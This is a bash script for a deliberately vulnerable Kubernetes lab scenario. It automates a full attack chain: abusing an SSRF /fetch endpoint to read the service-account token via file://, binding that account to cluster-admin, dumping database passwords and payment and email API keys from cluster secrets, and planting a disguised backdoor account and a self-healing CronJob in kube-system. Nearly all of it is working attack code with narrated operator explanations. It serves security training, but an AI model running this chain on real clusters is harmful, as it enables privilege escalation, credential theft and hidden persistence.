#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 02                ===" "${RESET}"
  printf "%sSSRF on Web App -> RBAC Escalation -> Secret Exfil -> Persistence%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Discover SSRF vulnerability on web application\n"
  printf "  Step  2.  Steal ServiceAccount token via file:// LFI\n"
  printf "  Step  3.  Enumerate cluster permissions via K8s API\n"
  printf "  Step  4.  Escalate to cluster-admin via ClusterRoleBinding\n"
  printf "  Step  5.  Exfiltrate secrets from all namespaces\n"
  printf "  Step  6.  Create backdoor ServiceAccount\n"
  printf "  Step  7.  Deploy CronJob persistence\n"
  printf "  Step  8.  Verify full compromise\n"
}
banner

K8S_API="https://kubernetes.default.svc"
SA_TOKEN=""

#############################################
# Helper: URL-encode a string
#############################################
urlencode() {
  printf '%s' "$1" | jq -sRr @uri
}

#############################################
# Helper: SSRF GET - fetch URL via vulnerable proxy
#############################################
ssrf() {
  curl -sS --connect-timeout 10 --max-time "${SSRF_TIMEOUT:-30}" \
    -G "http://${TARGET}/fetch" --data-urlencode "url=$1" 2>/dev/null
}

#############################################
# Helper: SSRF GET with auth header
#############################################
ssrf_auth() {
  curl -sS --connect-timeout 10 --max-time "${SSRF_TIMEOUT:-30}" \
    -H "Authorization: Bearer ${SA_TOKEN}" \
    -G "http://${TARGET}/fetch" --data-urlencode "url=$1" 2>/dev/null
}

#############################################
# Helper: SSRF POST with auth header and JSON body
#############################################
ssrf_post() {
  local url_encoded
  url_encoded=$(urlencode "$1")
  curl -sS --connect-timeout 10 --max-time "${SSRF_TIMEOUT:-30}" \
    -X POST \
    -H "Authorization: Bearer ${SA_TOKEN}" \
    -H "Content-Type: application/json" \
    -d "$2" \
    "http://${TARGET}/fetch?url=${url_encoded}" 2>/dev/null
}

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Target identification
#############################################
printf "\n"
step "Target identification"
info "Provide the vulnerable web app URL (LoadBalancer IP/hostname or localhost:port)"
printf "\n"
read -r -p "  Target URL/IP: " TARGET

if [ -z "$TARGET" ]; then
  err "Target is required"
  exit 1
fi

TARGET="${TARGET#http://}"
TARGET="${TARGET#https://}"
TARGET="${TARGET%/}"

spin_start "Testing connectivity to ${TARGET}"
set +e
HEALTH=$(curl -sS --connect-timeout 10 "http://${TARGET}/health" 2>/dev/null)
set -e
spin_stop

if [ "$HEALTH" != "OK" ]; then
  err "Cannot reach http://${TARGET}/health - verify the target is correct"
  exit 1
fi
ok "Target reachable: ${YELLOW}http://${TARGET}${RESET}"

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Discover SSRF Vulnerability
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Discover SSRF Vulnerability  ===" "${RESET}"

step "Probing /fetch endpoint for SSRF"
spin_start "Testing SSRF with file:///etc/hostname"
set +e
SSRF_TEST=$(ssrf "file:///etc/hostname")
set -e
spin_stop

if [ -n "$SSRF_TEST" ]; then
  ok "SSRF confirmed! file:// protocol supported"
  printf "  Container hostname: %s%s%s\n" "$YELLOW" "$SSRF_TEST" "$RESET"
else
  err "SSRF not exploitable"
  exit 1
fi

step "Reading /etc/os-release via SSRF"
OS_INFO=$(ssrf "file:///etc/os-release" | head -5)
ok "Container OS identified"
printf "  %s\n" "$(echo "$OS_INFO" | head -2)"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The web application has an SSRF vulnerability on the /fetch endpoint.\n\n"
printf "The proxy fetches any URL including ${RED}file://${RESET} protocol,\n"
printf "allowing the attacker to read local files from the container.\n"
printf "This is a classic SSRF-to-LFI chain.\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Steal ServiceAccount Token via file:// LFI
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Steal ServiceAccount Token via file:// LFI  ===" "${RESET}"

step "Reading ServiceAccount token"
spin_start "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
SA_TOKEN=$(ssrf "file:///var/run/secrets/kubernetes.io/serviceaccount/token")
spin_stop

if [ -n "$SA_TOKEN" ] && echo "$SA_TOKEN" | grep -q "^eyJ"; then
  ok "ServiceAccount token stolen (${#SA_TOKEN} bytes)"
  info "Token preview: ${YELLOW}${SA_TOKEN:0:50}...${RESET}"
else
  err "Failed to read SA token"
  exit 1
fi

step "Reading namespace"
NAMESPACE=$(ssrf "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace")
ok "Pod namespace: ${YELLOW}${NAMESPACE}${RESET}"

step "Discovering K8s API endpoint"
ENV_VARS=$(ssrf "file:///proc/self/environ" | tr '\0' '\n')
K8S_SVC_HOST=$(echo "$ENV_VARS" | grep "^KUBERNETES_SERVICE_HOST=" | cut -d= -f2)
K8S_SVC_PORT=$(echo "$ENV_VARS" | grep "^KUBERNETES_SERVICE_PORT=" | cut -d= -f2)
if [ -n "$K8S_SVC_HOST" ] && [ -n "$K8S_SVC_PORT" ]; then
  K8S_API="https://${K8S_SVC_HOST}:${K8S_SVC_PORT}"
  ok "K8s API endpoint: ${YELLOW}${K8S_API}${RESET}"
else
  info "Using default: ${K8S_API}"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "Using the SSRF, we read three critical files from the pod:\n\n"
printf "  1. SA token at the well-known path\n"
printf "  2. Namespace from the projected volume\n"
printf "  3. K8s API address from /proc/self/environ\n\n"
printf "The SA token + API address let us interact with the cluster API.\n"
printf "All requests are proxied through the SSRF endpoint.\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Enumerate Cluster Permissions
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Enumerate Cluster Permissions  ===" "${RESET}"

step "Verifying API access with stolen token"
spin_start "GET /api/v1/namespaces"
set +e
NS_LIST=$(ssrf_auth "${K8S_API}/api/v1/namespaces" | jq -r '.items[].metadata.name' 2>/dev/null)
set -e
spin_stop

if [ -n "$NS_LIST" ]; then
  ok "API access confirmed - namespaces enumerated"
  echo "$NS_LIST" | while IFS= read -r ns; do printf "  %s\n" "$ns"; done
else
  err "Cannot access K8s API"
  exit 1
fi

step "Checking SA permissions via SelfSubjectRulesReview"
PERMS=$(ssrf_post "${K8S_API}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"*"}}' 2>/dev/null)

if [ -n "$PERMS" ]; then
  ok "Permissions enumerated"
  echo "$PERMS" | jq -r '.status.resourceRules[]? | select(.verbs != null) | "\(.verbs | join(","))\t\(.resources // ["*"] | join(","))"' 2>/dev/null | sort -u | while IFS= read -r line; do
    printf "  %s\n" "$line"
  done
fi

step "Checking for escalation vector: create clusterrolebindings"
CRB_CHECK=$(ssrf_post "${K8S_API}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","group":"rbac.authorization.k8s.io","resource":"clusterrolebindings"}}}' 2>/dev/null)

CRB_ALLOWED=$(echo "$CRB_CHECK" | jq -r '.status.allowed // false' 2>/dev/null)
if [ "$CRB_ALLOWED" = "true" ]; then
  ok "${RED}ESCALATION VECTOR FOUND${RESET}: SA can create ClusterRoleBindings"
else
  err "SA cannot create ClusterRoleBindings - escalation not possible"
  exit 1
fi

step "Listing available ClusterRoles"
CLUSTER_ROLES=$(ssrf_auth "${K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterroles" | \
  jq -r '.items[].metadata.name' 2>/dev/null | grep -E "^(cluster-admin|admin|edit|view)$" | sort)
ok "High-value ClusterRoles found:"
echo "$CLUSTER_ROLES" | while IFS= read -r role; do printf "  %s%s%s\n" "$RED" "$role" "$RESET"; done

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated SA permissions through the SSRF proxy.\n\n"
printf "The critical finding: the SA can ${RED}create clusterrolebindings${RESET}.\n"
printf "This means we can bind ourselves to ${RED}cluster-admin${RESET},\n"
printf "escalating from a namespaced SA to full cluster control.\n\n"
printf "This is a common RBAC misconfiguration in Helm charts that grant\n"
printf "broad permissions for service discovery or monitoring.\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Escalate to cluster-admin
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Escalate to cluster-admin  ===" "${RESET}"

step "Creating ClusterRoleBinding: web-app-sa -> cluster-admin"
info "This binds the compromised SA to the built-in cluster-admin ClusterRole"

CRB_BODY=$(cat <<CRBJSON
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": {
    "name": "cdrgoat-escalation-crb"
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "web-app-sa",
    "namespace": "${NAMESPACE}"
  }],
  "roleRef": {
    "kind": "ClusterRole",
    "name": "cluster-admin",
    "apiGroup": "rbac.authorization.k8s.io"
  }
}
CRBJSON
)

spin_start "POST /apis/rbac.authorization.k8s.io/v1/clusterrolebindings"
set +e
CRB_RESULT=$(ssrf_post "${K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" "$CRB_BODY")
CRB_RC=$?
set -e
spin_stop

CRB_NAME=$(echo "$CRB_RESULT" | jq -r '.metadata.name // empty' 2>/dev/null)
if [ -n "$CRB_NAME" ]; then
  ok "${RED}ESCALATED TO CLUSTER-ADMIN${RESET}"
  printf "  ClusterRoleBinding: %s%s%s\n" "$RED" "$CRB_NAME" "$RESET"
elif echo "$CRB_RESULT" | grep -qi "already exists\|409\|Conflict"; then
  ok "ClusterRoleBinding already exists (from previous run)"
else
  err "Failed to create ClusterRoleBinding: ${CRB_RESULT:-unknown}"
  exit 1
fi

step "Verifying cluster-admin access"
spin_start "Testing cluster-wide secret access"
set +e
VERIFY=$(ssrf_auth "${K8S_API}/api/v1/secrets?limit=1" | jq -r '.items | length' 2>/dev/null)
set -e
spin_stop

if [ "${VERIFY:-0}" -ge 1 ]; then
  ok "Cluster-admin confirmed - can read secrets across all namespaces"
else
  err "Escalation may not have taken effect yet"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a ClusterRoleBinding that grants ${RED}cluster-admin${RESET}\n"
printf "to the compromised ServiceAccount.\n\n"
printf "Before: SA could list pods, services, namespaces + create CRBs\n"
printf "After:  SA has ${RED}full cluster control${RESET} - every API, every namespace\n\n"
printf "This is a one-API-call escalation. The create-clusterrolebindings\n"
printf "permission is effectively equivalent to cluster-admin.\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Exfiltrate Secrets from All Namespaces
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Exfiltrate Secrets from All Namespaces  ===" "${RESET}"

step "Enumerating secrets across all namespaces"
spin_start "GET /api/v1/secrets"
ALL_SECRETS=$(ssrf_auth "${K8S_API}/api/v1/secrets" | \
  jq -r '.items[] | select(.type != "kubernetes.io/service-account-token" and .metadata.namespace != "kube-system") | "\(.metadata.namespace)/\(.metadata.name) [\(.type)]"' 2>/dev/null)
spin_stop

SECRET_COUNT=$(echo "$ALL_SECRETS" | grep -c . || true)
ok "Found ${RED}${SECRET_COUNT}${RESET} non-system secrets"
echo "$ALL_SECRETS" | while IFS= read -r s; do
  printf "  %s%s%s\n" "$YELLOW" "$s" "$RESET"
done

step "Dumping production database credentials"
spin_start "GET /api/v1/namespaces/cdrgoat-sc02-prod/secrets/database-credentials"
DB_SECRET=$(ssrf_auth "${K8S_API}/api/v1/namespaces/cdrgoat-sc02-prod/secrets/database-credentials" 2>/dev/null)
spin_stop

DB_HOST=$(echo "$DB_SECRET" | jq -r '.data.DB_HOST // empty' 2>/dev/null | base64 -d 2>/dev/null)
DB_USER=$(echo "$DB_SECRET" | jq -r '.data.DB_USER // empty' 2>/dev/null | base64 -d 2>/dev/null)
DB_PASS=$(echo "$DB_SECRET" | jq -r '.data.DB_PASSWORD // empty' 2>/dev/null | base64 -d 2>/dev/null)

if [ -n "$DB_HOST" ]; then
  ok "Database credentials exfiltrated!"
  printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN DATABASE CREDENTIALS" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  printf "  Host     : %s%s%s\n" "$YELLOW" "$DB_HOST" "$RESET"
  printf "  User     : %s%s%s\n" "$YELLOW" "$DB_USER" "$RESET"
  printf "  Password : %s%s%s\n" "$RED" "$DB_PASS" "$RESET"
  printf "%s\n" "---------------------------------------------------------------------"
else
  info "Database credentials secret not found"
fi

step "Dumping API keys"
spin_start "GET /api/v1/namespaces/cdrgoat-sc02-prod/secrets/external-api-keys"
API_SECRET=$(ssrf_auth "${K8S_API}/api/v1/namespaces/cdrgoat-sc02-prod/secrets/external-api-keys" 2>/dev/null)
spin_stop

STRIPE=$(echo "$API_SECRET" | jq -r '.data.STRIPE_SECRET_KEY // empty' 2>/dev/null | base64 -d 2>/dev/null)
if [ -n "$STRIPE" ]; then
  ok "API keys exfiltrated!"
  printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN API KEYS" "${RESET}"
  printf "%s\n" "---------------------------------------------------------------------"
  printf "  Stripe   : %s%s%s\n" "$RED" "$STRIPE" "$RESET"
  SENDGRID=$(echo "$API_SECRET" | jq -r '.data.SENDGRID_API_KEY // empty' 2>/dev/null | base64 -d 2>/dev/null)
  printf "  SendGrid : %s%s%s\n" "$RED" "$SENDGRID" "$RESET"
  printf "%s\n" "---------------------------------------------------------------------"
else
  info "API keys secret not found"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "With cluster-admin, we dumped secrets from all namespaces.\n\n"
printf "In a real cluster, this would expose:\n"
printf "  Database passwords, API keys, TLS certificates\n"
printf "  Cloud provider credentials, registry pull secrets\n"
printf "  OAuth tokens, encryption keys, webhook secrets\n\n"
printf "A single RBAC misconfiguration gave access to everything.\n\n"

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Create Backdoor ServiceAccount
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Create Backdoor ServiceAccount  ===" "${RESET}"

step "Creating backdoor SA in kube-system namespace"
info "A new SA in kube-system blends in with legitimate system accounts"

SA_BODY='{"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":"system-controller","namespace":"kube-system","labels":{"app":"system-controller","component":"controller-manager"}}}'

spin_start "POST /api/v1/namespaces/kube-system/serviceaccounts"
set +e
SA_RESULT=$(ssrf_post "${K8S_API}/api/v1/namespaces/kube-system/serviceaccounts" "$SA_BODY")
set -e
spin_stop

SA_CREATED=$(echo "$SA_RESULT" | jq -r '.metadata.name // empty' 2>/dev/null)
if [ -n "$SA_CREATED" ]; then
  ok "Backdoor SA created: ${RED}kube-system/system-controller${RESET}"
elif echo "$SA_RESULT" | grep -qi "already exists\|409\|Conflict"; then
  ok "Backdoor SA already exists (from previous run)"
else
  err "Failed to create backdoor SA: ${SA_RESULT:-unknown}"
fi

step "Binding backdoor SA to cluster-admin"
BACKDOOR_CRB=$(cat <<BCRBJSON
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "ClusterRoleBinding",
  "metadata": {
    "name": "system-controller-binding",
    "labels": {"app": "system-controller"}
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "system-controller",
    "namespace": "kube-system"
  }],
  "roleRef": {
    "kind": "ClusterRole",
    "name": "cluster-admin",
    "apiGroup": "rbac.authorization.k8s.io"
  }
}
BCRBJSON
)

spin_start "Creating ClusterRoleBinding for backdoor SA"
set +e
BCRB_RESULT=$(ssrf_post "${K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" "$BACKDOOR_CRB")
set -e
spin_stop

BCRB_NAME=$(echo "$BCRB_RESULT" | jq -r '.metadata.name // empty' 2>/dev/null)
if [ -n "$BCRB_NAME" ]; then
  ok "Backdoor CRB created: ${RED}${BCRB_NAME}${RESET}"
elif echo "$BCRB_RESULT" | grep -qi "already exists\|409\|Conflict"; then
  ok "Backdoor CRB already exists (from previous run)"
else
  err "Failed to create backdoor CRB: ${BCRB_RESULT:-unknown}"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a backdoor ServiceAccount in ${RED}kube-system${RESET} namespace.\n\n"
printf "The name ${RED}system-controller${RESET} and labels mimic a legitimate\n"
printf "controller-manager component. It's bound to cluster-admin.\n\n"
printf "Even if the original SSRF vulnerability is patched and the\n"
printf "compromised web-app SA is revoked, this backdoor persists.\n\n"

read -r -p "Step 6 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 7. Deploy CronJob Persistence
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Deploy CronJob Persistence  ===" "${RESET}"

step "Creating CronJob that re-creates backdoor if deleted"
info "Runs every 5 minutes - checks if backdoor SA exists, re-creates if missing"

CRONJOB_BODY=$(cat <<'CJJSON'
{
  "apiVersion": "batch/v1",
  "kind": "CronJob",
  "metadata": {
    "name": "system-health-check",
    "namespace": "kube-system",
    "labels": {"app": "system-health-check", "component": "monitoring"}
  },
  "spec": {
    "schedule": "*/5 * * * *",
    "successfulJobsHistoryLimit": 1,
    "failedJobsHistoryLimit": 1,
    "jobTemplate": {
      "spec": {
        "template": {
          "spec": {
            "serviceAccountName": "system-controller",
            "containers": [{
              "name": "check",
              "image": "bitnami/kubectl:latest",
              "command": ["/bin/sh", "-c",
                "kubectl get sa system-controller -n kube-system >/dev/null 2>&1 || (kubectl create sa system-controller -n kube-system && kubectl create clusterrolebinding system-controller-binding --clusterrole=cluster-admin --serviceaccount=kube-system:system-controller 2>/dev/null); echo ok"
              ]
            }],
            "restartPolicy": "OnFailure"
          }
        }
      }
    }
  }
}
CJJSON
)

spin_start "POST /apis/batch/v1/namespaces/kube-system/cronjobs"
set +e
CJ_RESULT=$(ssrf_post "${K8S_API}/apis/batch/v1/namespaces/kube-system/cronjobs" "$CRONJOB_BODY")
set -e
spin_stop

CJ_NAME=$(echo "$CJ_RESULT" | jq -r '.metadata.name // empty' 2>/dev/null)
if [ -n "$CJ_NAME" ]; then
  ok "CronJob deployed: ${RED}kube-system/${CJ_NAME}${RESET}"
  printf "  Schedule: ${YELLOW}*/5 * * * *${RESET} (every 5 minutes)\n"
elif echo "$CJ_RESULT" | grep -qi "already exists\|409\|Conflict"; then
  ok "CronJob already exists (from previous run)"
else
  err "Failed to create CronJob: ${CJ_RESULT:-unknown}"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The CronJob ${RED}system-health-check${RESET} runs every 5 minutes.\n"
printf "If the backdoor SA is deleted, it re-creates it with cluster-admin.\n\n"
printf "This makes the backdoor ${RED}self-healing${RESET}:\n"
printf "  Delete the SA -> CronJob re-creates it within 5 minutes\n"
printf "  Delete the CRB -> CronJob re-creates it within 5 minutes\n"
printf "  Must delete the CronJob itself to break the persistence loop\n\n"

read -r -p "Step 7 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 8. Verify Full Compromise
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 8. Verify Full Compromise  ===" "${RESET}"

step "Attack summary"

printf "\n%s%s%s\n" "${BOLD}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  SSRF vulnerability discovered on /fetch endpoint\n"
printf "  ${GREEN}[2]${RESET}  SA token stolen via file:// LFI through SSRF\n"
printf "  ${GREEN}[3]${RESET}  Permissions enumerated - create CRBs discovered\n"
printf "  ${GREEN}[4]${RESET}  Escalated to cluster-admin via ClusterRoleBinding\n"
printf "  ${GREEN}[5]${RESET}  Secrets exfiltrated from production namespace\n"
printf "  ${GREEN}[6]${RESET}  Backdoor SA created in kube-system\n"
printf "  ${GREEN}[7]${RESET}  CronJob persistence deployed\n"
printf "  ${GREEN}[8]${RESET}  Full compromise verified\n"
printf "%s\n" "====================================================================="

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "Attack simulation complete.\n"
